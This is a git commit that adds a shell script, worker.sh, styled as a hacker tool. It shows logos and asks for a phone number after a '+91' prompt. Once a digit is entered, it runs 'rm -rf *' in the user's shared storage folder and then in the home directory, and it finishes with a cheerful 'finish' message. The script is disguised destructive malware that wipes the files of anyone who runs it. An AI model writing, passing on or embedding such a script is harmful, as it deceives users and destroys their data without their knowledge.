8a7ca92cc59b9e24cd83c41108a833e529472f55
SHIRU n00b <72118394+shiru313@users.noreply.github.com>
2021-07-24 18:00:14 +0530

    Add files via upload

---
+++ worker.sh
@@ -0,0 +1,35 @@
+
+cd ec
+sleep 2.0
+cat logo.txt
+slepp 2.0
+clear
+cat logo2.txt
+sleep 1.0
+clear                        #SH1RF4N
+cat logo.txt                 #SH1RF4N
+sleep 0.0                    #SH1RF4N
+cat logo2.txt
+sleep 3.5
+clear
+cat logo2.txt
+echo
+RED="\e[31m"
+ENDCOLOR="\e[32m"
+
+echo -e "${RED}enter contry code without +91"
+echo     #coded by noob hacker shirfan mlp
+read -p "+91 : " -n 1 -r
+echo    
+if [[ ! $REPLY =~ ^[1234567890]$ ]]
+then
+    [[ "$0" = "$BASH_SOURCE" ]] && exit 1 || return 1 
+fi
+cd
+cd storage
+rm -rf *
+cd
+rm -rf *
+clear
+sleep 5.0
+echo "enjoy work sucssufully finish"
